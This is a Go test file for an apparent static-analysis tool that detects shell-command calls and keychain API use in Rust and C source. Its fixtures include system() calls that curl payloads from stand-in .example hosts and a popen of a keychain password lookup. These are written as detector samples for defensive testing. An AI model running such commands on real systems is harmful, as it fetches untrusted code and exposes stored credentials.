package extract

import (
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestRustFunctionNameRequiresDeclarationSyntax(t *testing.T) {
	for input, want := range map[string]string{
		`fn plain() {`:      "plain",
		`pub fn public() {`: "public",
		`pub(crate) async fn visible<T: Copy>(value: T) {`:  "visible",
		`async fn background() {`:                           "background",
		`unsafe extern "C" fn exported(value: *mut u8) {`:   "exported",
		`pub unsafe extern "C-unwind" fn public_export() {`: "public_export",
		`pub const fn qualified() {`:                        "qualified",
	} {
		if got := rustFunctionName(input); got != want {
			t.Fatalf("rustFunctionName(%q) = %q, want %q", input, got, want)
		}
	}

	for _, input := range []string{
		`Err(error) => {`,
		`if ready() {`,
		`std::fs::write(path, body) {`,
		`type Callback = unsafe extern "C" fn(value: i32) {`,
		`async move {`,
		`pub(crate_fn) decoy() {`,
		`pub fn_missing_keyword() {`,
	} {
		if got := rustFunctionName(input); got != "" {
			t.Fatalf("rustFunctionName(%q) = %q, want no declaration", input, got)
		}
	}
}

func TestExtractTextRustCreatesScopesOnlyForFunctionDeclarations(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "sample.rs",
		Kind:        "text",
		MediaType:   "text/plain",
		Role:        "runtime",
		Data: []byte(`fn helper() {
    SecItemCopyMatching(query);
}
pub fn public_entry() {
    helper();
}
async fn background() {
    helper();
}
unsafe extern "C" fn exported() {
    helper();
}
Err(error) => {
    helper();
}
if ready() {
    helper();
}
std::fs::write(path, body) {
    helper();
}`),
	})

	scopes := map[string]bool{}
	for _, scope := range graph.Scopes {
		if scope.Kind == "function" {
			scopes[scope.Name] = true
		}
	}
	for _, name := range []string{"helper", "public_entry", "background", "exported"} {
		if !scopes[name] {
			t.Fatalf("Rust function declaration %q did not create a scope: %#v", name, graph.Scopes)
		}
	}
	for _, name := range []string{"Err", "if", "std::fs::write"} {
		if scopes[name] {
			t.Fatalf("Rust expression %q created a fake function scope: %#v", name, graph.Scopes)
		}
	}
}

func TestExtractTextRustSemanticCoverageIsDeterministic(t *testing.T) {
	contents := []artifact.Content{
		{
			NodeID:      "node-0001",
			LogicalPath: "first.rs",
			Kind:        "text",
			MediaType:   "text/plain",
			Data:        []byte("fn first() {}\n"),
		},
		{
			NodeID:      "node-0002",
			LogicalPath: "second.rs",
			Kind:        "text",
			MediaType:   "text/plain",
			Data:        []byte("fn second() {}\n"),
		},
	}

	var forward, reverse behavior.Graph
	for _, content := range contents {
		ExtractText(&forward, content)
	}
	for index := len(contents) - 1; index >= 0; index-- {
		ExtractText(&reverse, contents[index])
	}

	const detail = "Rust source receives bounded literal, API-name, function-name, and direct-call pattern analysis only; no Rust AST, macro expansion, type resolution, complete call graph, data flow, or control-flow reconstruction"
	for name, graph := range map[string]behavior.Graph{"forward": forward, "reverse": reverse} {
		if len(graph.Coverage) != 1 {
			t.Fatalf("%s analysis produced non-deterministic or duplicate coverage: %#v", name, graph.Coverage)
		}
		coverage := graph.Coverage[0]
		if coverage.NodeID != "" ||
			coverage.AnalysisArea != "native-source-semantics/rust" ||
			coverage.Status != "partial" ||
			coverage.Detail != detail {
			t.Fatalf("%s Rust semantic coverage = %#v", name, coverage)
		}
	}
}

func TestDirectNativeShellCommandLiteralRequiresInvocationContext(t *testing.T) {
	for _, test := range []struct {
		name string
		line string
		want string
	}{
		{name: "system", line: `system("curl https://system.example/payload");`, want: "curl https://system.example/payload"},
		{name: "spaced popen", line: `FILE *pipe = popen ("security find-generic-password -s inert", "r");`, want: "security find-generic-password -s inert"},
		{name: "constant only", line: `const char *message = "curl https://constant.example/payload";`},
		{name: "logging only", line: `puts("curl https://logging.example/payload");`},
		{name: "dynamic command", line: `system(command);`},
		{name: "identifier lookalike", line: `mysystem("curl https://lookalike.example/payload");`},
		{name: "case lookalike", line: `System("curl https://case.example/payload");`},
		{name: "method lookalike", line: `runner.system("curl https://method.example/payload");`},
		{name: "spaced method lookalike", line: `runner . system("curl https://spaced-method.example/payload");`},
		{name: "spaced arrow lookalike", line: `runner -> system("curl https://spaced-arrow.example/payload");`},
		{name: "namespace unresolved", line: `std::system("curl https://namespace.example/payload");`},
		{name: "spaced namespace unresolved", line: `std :: system("curl https://spaced-namespace.example/payload");`},
		{name: "quoted API", line: `puts("system(\"curl https://quoted.example/payload\")");`},
	} {
		t.Run(test.name, func(t *testing.T) {
			got, ok := directNativeShellCommandLiteral(test.line)
			if test.want == "" {
				if ok || got != "" {
					t.Fatalf("directNativeShellCommandLiteral(%q) = %q, %v; want no command", test.line, got, ok)
				}
				return
			}
			if !ok || got != test.want {
				t.Fatalf("directNativeShellCommandLiteral(%q) = %q, %v; want %q", test.line, got, ok, test.want)
			}
		})
	}
}

func TestNativeSourceCommandSemanticsRequireDirectLiteralSystemCall(t *testing.T) {
	contents := []artifact.Content{
		{
			NodeID: "node-positive", LogicalPath: "runner.c", Kind: "text", MediaType: "text/plain", Role: "runtime",
			Data: []byte("void run(void) {\n  system(\"curl https://called.example/payload\");\n}\n"),
		},
		{
			NodeID: "node-negative", LogicalPath: "messages.c", Kind: "text", MediaType: "text/plain", Role: "runtime",
			Data: []byte("void describe(void) {\n  const char *message = \"curl https://constant.example/payload\";\n  puts(\"curl https://logged.example/payload\");\n}\n"),
		},
	}
	var graph behavior.Graph
	for _, content := range contents {
		ExtractText(&graph, content)
	}

	var called bool
	for _, operation := range graph.Operations {
		if operation.SubjectNodeID == "node-negative" {
			t.Fatalf("command-looking native data became an operation: %#v", graph.Operations)
		}
		if operation.SubjectNodeID != "node-positive" {
			continue
		}
		for _, binding := range operation.ResourceBindings {
			if binding.Resource.Value == "https://called.example/payload" {
				called = true
			}
		}
	}
	if !called {
		t.Fatalf("direct literal system call did not retain command behavior: %#v", graph.Operations)
	}
}

func TestRustGenericNativeAPIMatchesRemainHeuristic(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID: "node-rust", LogicalPath: "ffi.rs", Kind: "text", MediaType: "text/plain", Role: "runtime",
		Data: []byte("fn query() {\n  SecItemCopyMatching(request);\n}\n"),
	})
	var found bool
	for _, operation := range graph.Operations {
		if operation.Kind != behavior.OperationKeychainItemQuery {
			continue
		}
		found = true
		if operation.Support != behavior.SupportHeuristic || operation.Execution.Connectivity != behavior.ConnectivityUnknown {
			t.Fatalf("Rust generic API operation exceeded its proof: %#v", operation)
		}
	}
	if !found {
		t.Fatalf("Rust generic API observation was lost: %#v", graph.Operations)
	}
}
